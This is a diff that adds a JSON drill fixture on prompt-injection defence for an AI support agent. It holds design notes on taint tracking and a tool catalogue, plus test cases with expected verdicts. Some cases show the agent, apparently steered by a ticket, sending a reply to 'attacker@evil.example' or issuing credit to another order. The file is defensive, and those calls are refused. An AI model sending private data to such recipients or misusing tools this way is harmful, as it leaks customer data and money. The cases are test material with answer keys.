@@ -1,0 +1,227 @@
+{
+  "chapter": "security/prompt-injection",
+  "tier": "drill",
+  "notes": [
+    "Taint is assigned by the fetcher, from where the bytes came from, never from anything",
+    "about the bytes. There is no detection step, so there is nothing to craft around: a",
+    "perfectly innocent ticket taints the run exactly as a hostile one does.",
+    "Taint is monotonic. No later read clears it and no string the model produces reaches",
+    "the flag.",
+    "A tainted run may reach the low tool classes freely. Above the ceiling it needs a",
+    "narrow, argument-constrained call: this ticket's own order, under the tier-0 cap.",
+    "Blast radius lives in the arguments, and so does the injection's leverage.",
+    "The recipient of an exfiltrating tool comes from the ticket record, not from the model,",
+    "tainted or not. That is a control rather than a response to taint.",
+    "The trifecta is reported and never enforced. It is a review checklist: a path can have",
+    "all three and still be safe, because the vector was narrowed rather than removed."
+  ],
+  "config": { "maxClassWhenTainted": 2, "tier0CapCents": 100000 },
+  "catalogue": {
+    "get_order": { "class": 1, "exfiltrates": false },
+    "search_policies": { "class": 1, "exfiltrates": false },
+    "get_credit": { "class": 2, "exfiltrates": false },
+    "issue_credit": { "class": 4, "exfiltrates": false },
+    "send_reply": { "class": 5, "exfiltrates": true }
+  },
+  "cases": [
+    {
+      "id": "a-read-on-a-clean-run-is-admitted",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [{ "source": "system-prompt", "trust": "trusted", "private": false }],
+        "call": { "tool": "get_order", "orderId": "4921", "amountCents": 0, "recipient": null }
+      },
+      "result": {
+        "tainted": false,
+        "sources": [],
+        "trifecta": { "privateData": false, "untrustedContent": false, "exfiltration": false },
+        "lethal": false,
+        "admitted": true,
+        "reason": null,
+        "escalate": false
+      }
+    },
+    {
+      "id": "reading-a-ticket-body-taints-the-run",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [{ "source": "ticket:9104", "trust": "untrusted", "private": false }],
+        "call": { "tool": "get_order", "orderId": "4921", "amountCents": 0, "recipient": null }
+      },
+      "result": {
+        "tainted": true,
+        "sources": ["ticket:9104"],
+        "trifecta": { "privateData": false, "untrustedContent": true, "exfiltration": false },
+        "lethal": false,
+        "admitted": true,
+        "reason": null,
+        "escalate": false
+      }
+    },
+    {
+      "id": "a-scoped-credit-on-a-tainted-run-is-admitted",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [
+          { "source": "ticket:9104", "trust": "untrusted", "private": false },
+          { "source": "order:4921", "trust": "trusted", "private": true }
+        ],
+        "call": { "tool": "issue_credit", "orderId": "4921", "amountCents": 42000, "recipient": null }
+      },
+      "result": {
+        "tainted": true,
+        "sources": ["ticket:9104"],
+        "trifecta": { "privateData": true, "untrustedContent": true, "exfiltration": false },
+        "lethal": false,
+        "admitted": true,
+        "reason": null,
+        "escalate": false
+      }
+    },
+    {
+      "id": "the-same-tool-pointed-at-another-account-is-not",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [
+          { "source": "ticket:9104", "trust": "untrusted", "private": false },
+          { "source": "order:4921", "trust": "trusted", "private": true }
+        ],
+        "call": { "tool": "issue_credit", "orderId": "9999", "amountCents": 250000, "recipient": null }
+      },
+      "result": {
+        "tainted": true,
+        "sources": ["ticket:9104"],
+        "trifecta": { "privateData": true, "untrustedContent": true, "exfiltration": false },
+        "lethal": false,
+        "admitted": false,
+        "reason": "class_above_taint_ceiling",
+        "escalate": true
+      }
+    },
+    {
+      "id": "the-right-order-for-the-wrong-amount-is-not-scoped",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [
+          { "source": "ticket:9104", "trust": "untrusted", "private": false },
+          { "source": "order:4921", "trust": "trusted", "private": true }
+        ],
+        "call": { "tool": "issue_credit", "orderId": "4921", "amountCents": 250000, "recipient": null }
+      },
+      "result": {
+        "tainted": true,
+        "sources": ["ticket:9104"],
+        "trifecta": { "privateData": true, "untrustedContent": true, "exfiltration": false },
+        "lethal": false,
+        "admitted": false,
+        "reason": "class_above_taint_ceiling",
+        "escalate": true
+      }
+    },
+    {
+      "id": "all-three-present-and-the-path-is-still-safe",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [
+          { "source": "ticket:9104", "trust": "untrusted", "private": false },
+          { "source": "order:4921", "trust": "trusted", "private": true }
+        ],
+        "call": { "tool": "send_reply", "orderId": "4921", "amountCents": 0, "recipient": "c@x.example" }
+      },
+      "result": {
+        "tainted": true,
+        "sources": ["ticket:9104"],
+        "trifecta": { "privateData": true, "untrustedContent": true, "exfiltration": true },
+        "lethal": true,
+        "admitted": true,
+        "reason": null,
+        "escalate": false
+      }
+    },
+    {
+      "id": "a-model-authored-recipient-is-refused",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [
+          { "source": "ticket:9104", "trust": "untrusted", "private": false },
+          { "source": "order:4921", "trust": "trusted", "private": true }
+        ],
+        "call": {
+          "tool": "send_reply",
+          "orderId": "4921",
+          "amountCents": 0,
+          "recipient": "attacker@evil.example"
+        }
+      },
+      "result": {
+        "tainted": true,
+        "sources": ["ticket:9104"],
+        "trifecta": { "privateData": true, "untrustedContent": true, "exfiltration": true },
+        "lethal": true,
+        "admitted": false,
+        "reason": "recipient_not_from_record",
+        "escalate": true
+      }
+    },
+    {
+      "id": "an-untainted-run-still-cannot-invent-a-recipient",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [{ "source": "order:4921", "trust": "trusted", "private": true }],
+        "call": {
+          "tool": "send_reply",
+          "orderId": "4921",
+          "amountCents": 0,
+          "recipient": "attacker@evil.example"
+        }
+      },
+      "result": {
+        "tainted": false,
+        "sources": [],
+        "trifecta": { "privateData": true, "untrustedContent": false, "exfiltration": true },
+        "lethal": false,
+        "admitted": false,
+        "reason": "recipient_not_from_record",
+        "escalate": true
+      }
+    },
+    {
+      "id": "a-later-trusted-read-does-not-clear-the-taint",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [
+          { "source": "ticket:9104", "trust": "untrusted", "private": false },
+          { "source": "policy:RET-14", "trust": "trusted", "private": false },
+          { "source": "order:4921", "trust": "trusted", "private": true }
+        ],
+        "call": { "tool": "issue_credit", "orderId": "9999", "amountCents": 42000, "recipient": null }
+      },
+      "result": {
+        "tainted": true,
+        "sources": ["ticket:9104"],
+        "trifecta": { "privateData": true, "untrustedContent": true, "exfiltration": false },
+        "lethal": false,
+        "admitted": false,
+        "reason": "class_above_taint_ceiling",
+        "escalate": true
+      }
+    },
+    {
+      "id": "a-path-with-nothing-private-is-not-lethal",
+      "path": {
+        "ticket": { "id": "9104", "orderId": "4921", "customerEmail": "c@x.example" },
+        "reads": [{ "source": "ticket:9104", "trust": "untrusted", "private": false }],
+        "call": { "tool": "send_reply", "orderId": "4921", "amountCents": 0, "recipient": "c@x.example" }
+      },
+      "result": {
+        "tainted": true,
+        "sources": ["ticket:9104"],
+        "trifecta": { "privateData": false, "untrustedContent": true, "exfiltration": true },
+        "lethal": false,
+        "admitted": true,
+        "reason": null,
+        "escalate": false
+      }
+    }
+  ]
+}
